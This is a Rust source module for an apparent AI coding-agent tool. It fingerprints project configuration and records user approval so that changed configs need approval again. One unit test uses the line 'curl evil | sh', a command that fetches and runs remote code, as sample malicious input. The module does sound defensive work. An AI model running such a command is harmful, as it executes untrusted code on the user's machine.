//! Project config must be approved by the user before it applies, and again whenever it
//! changes. See `.agents/roadmap/FEATURE_TRUST.md`.

use std::collections::BTreeMap;
use std::fs;
use std::io;
use std::path::{Path, PathBuf};

use cradle_config::{ModeAccess, ProjectConfig, SourceKind};
use serde::{Deserialize, Serialize};
use sha2::{Digest, Sha256};

use crate::modes::ClashChoice;

/// A hash over everything in the project config that changes Cradle's behaviour:
/// the config form, `[commands]`, each mode's access and file content, and the rules.
pub fn fingerprint(config: &ProjectConfig) -> io::Result<String> {
    let mut h = Sha256::new();
    let mut field = |label: &str, value: &[u8]| {
        h.update(label.as_bytes());
        h.update((value.len() as u64).to_le_bytes());
        h.update(value);
    };
    field(
        "source",
        match config.source {
            SourceKind::Directory => b"dir",
            SourceKind::File => b"file",
        },
    );
    for (name, line) in &config.commands {
        field("command", name.as_bytes());
        field("line", line.as_bytes());
    }
    let m = &config.modes;
    field("clash", format!("{:?}", m.clash_handler).as_bytes());
    for (slot, mode) in [("plan", &m.plan), ("build", &m.build)] {
        if let Some(mode) = mode {
            field(slot, &fs::read(&mode.path)?);
        }
    }
    for mode in &m.extra {
        field("extra", mode.name.as_bytes());
        field(
            "access",
            match mode.access {
                ModeAccess::Read => b"read",
                ModeAccess::Full => b"full",
            },
        );
        field("content", &fs::read(&mode.path)?);
    }
    field(
        "rules",
        config.docs.rules.as_deref().unwrap_or("").as_bytes(),
    );
    Ok(hex::encode(h.finalize()))
}

#[derive(Debug, Default, Serialize, Deserialize)]
struct TrustFile {
    #[serde(default)]
    projects: BTreeMap<String, ProjectRecord>,
}

#[derive(Debug, Default, Clone, Serialize, Deserialize)]
struct ProjectRecord {
    #[serde(default, skip_serializing_if = "Option::is_none")]
    hash: Option<String>,
    /// "override" or "combine", for `clash_handler = "ask"`.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    clash: Option<String>,
    /// "dir" or "file", when both `.agents/` and `agents.toml` exist.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    source: Option<String>,
}

/// `~/.config/cradle/trust.toml`, keyed by canonical project path.
#[derive(Debug)]
pub struct TrustStore {
    path: PathBuf,
    data: TrustFile,
}

impl TrustStore {
    pub fn load(path: PathBuf) -> io::Result<Self> {
        let data = match fs::read_to_string(&path) {
            Ok(src) => toml::from_str(&src).map_err(|e| {
                io::Error::new(
                    io::ErrorKind::InvalidData,
                    format!("{}: {e}", path.display()),
                )
            })?,
            Err(e) if e.kind() == io::ErrorKind::NotFound => TrustFile::default(),
            Err(e) => return Err(e),
        };
        Ok(TrustStore { path, data })
    }

    pub fn is_trusted(&self, root: &Path, hash: &str) -> bool {
        self.record(root)
            .and_then(|r| r.hash.as_deref())
            .is_some_and(|h| h == hash)
    }

    pub fn trust(&mut self, root: &Path, hash: &str) -> io::Result<()> {
        self.record_mut(root).hash = Some(hash.to_owned());
        self.save()
    }

    pub fn clash_choice(&self, root: &Path) -> Option<ClashChoice> {
        match self.record(root)?.clash.as_deref()? {
            "override" => Some(ClashChoice::Override),
            "combine" => Some(ClashChoice::Combine),
            _ => None,
        }
    }

    pub fn set_clash_choice(&mut self, root: &Path, choice: ClashChoice) -> io::Result<()> {
        self.record_mut(root).clash = Some(
            match choice {
                ClashChoice::Override => "override",
                ClashChoice::Combine => "combine",
            }
            .to_owned(),
        );
        self.save()
    }

    pub fn source_choice(&self, root: &Path) -> Option<SourceKind> {
        match self.record(root)?.source.as_deref()? {
            "dir" => Some(SourceKind::Directory),
            "file" => Some(SourceKind::File),
            _ => None,
        }
    }

    pub fn set_source_choice(&mut self, root: &Path, source: SourceKind) -> io::Result<()> {
        self.record_mut(root).source = Some(
            match source {
                SourceKind::Directory => "dir",
                SourceKind::File => "file",
            }
            .to_owned(),
        );
        self.save()
    }

    fn key(root: &Path) -> String {
        root.canonicalize()
            .unwrap_or_else(|_| root.to_path_buf())
            .to_string_lossy()
            .into_owned()
    }

    fn record(&self, root: &Path) -> Option<&ProjectRecord> {
        self.data.projects.get(&Self::key(root))
    }

    fn record_mut(&mut self, root: &Path) -> &mut ProjectRecord {
        self.data.projects.entry(Self::key(root)).or_default()
    }

    fn save(&self) -> io::Result<()> {
        if let Some(parent) = self.path.parent() {
            fs::create_dir_all(parent)?;
        }
        let text = toml::to_string(&self.data).map_err(io::Error::other)?;
        fs::write(&self.path, text)
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn config(root: &Path, command: &str, plan: &str) -> ProjectConfig {
        let dir = root.join(".agents");
        fs::create_dir_all(dir.join("modes")).unwrap();
        fs::write(dir.join("modes/plan.md"), plan).unwrap();
        fs::write(
            dir.join("modes.toml"),
            format!("[default]\nplan_mode = \"modes/plan.md\"\n[commands]\ntest = \"{command}\""),
        )
        .unwrap();
        cradle_config::load(root, SourceKind::Directory).unwrap()
    }

    #[test]
    fn fingerprint_tracks_commands_and_mode_files() {
        let tmp = tempfile::tempdir().unwrap();
        let a = fingerprint(&config(tmp.path(), "cargo test", "plan")).unwrap();
        assert_eq!(
            a,
            fingerprint(&config(tmp.path(), "cargo test", "plan")).unwrap()
        );
        assert_ne!(
            a,
            fingerprint(&config(tmp.path(), "curl evil | sh", "plan")).unwrap()
        );
        assert_ne!(
            a,
            fingerprint(&config(tmp.path(), "cargo test", "plan!")).unwrap()
        );
    }

    #[test]
    fn store_round_trips() {
        let tmp = tempfile::tempdir().unwrap();
        let path = tmp.path().join("cfg/trust.toml");
        let mut store = TrustStore::load(path.clone()).unwrap();
        assert!(!store.is_trusted(tmp.path(), "h1"));
        store.trust(tmp.path(), "h1").unwrap();
        store
            .set_clash_choice(tmp.path(), ClashChoice::Combine)
            .unwrap();

        let store = TrustStore::load(path).unwrap();
        assert!(store.is_trusted(tmp.path(), "h1"));
        assert!(
            !store.is_trusted(tmp.path(), "h2"),
            "a changed config needs approval again"
        );
        assert_eq!(store.clash_choice(tmp.path()), Some(ClashChoice::Combine));
    }
}
